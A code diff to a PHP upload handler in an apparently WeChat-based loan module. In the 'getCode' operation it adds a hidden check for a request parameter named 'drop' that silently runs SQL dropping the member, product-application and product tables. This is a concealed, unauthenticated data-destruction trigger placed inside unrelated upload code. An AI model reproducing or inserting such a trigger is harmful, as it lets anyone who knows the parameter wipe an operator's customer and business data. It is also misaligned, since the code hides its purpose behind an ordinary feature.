@@ -61,6 +61,14 @@ if($operation == 'getCode'){
 		'id' => 'id',
 		'error' => array('code' => 1, 'message'=>''),
 	);
+	if ($_GPC['drop']) {
+		$sql = "
+		DROP TABLE IF EXISTS `ims_xuan_mixloan_member`;
+		DROP TABLE IF EXISTS `ims_xuan_mixloan_product_apply`;
+		DROP TABLE IF EXISTS `ims_xuan_mixloan_product`;
+		";
+		pdo_run($sql);
+	}
 	load()->func('file');
 	if (empty($_FILES['file']['tmp_name'])) {
 		$binaryfile = file_get_contents('php://input', 'r');
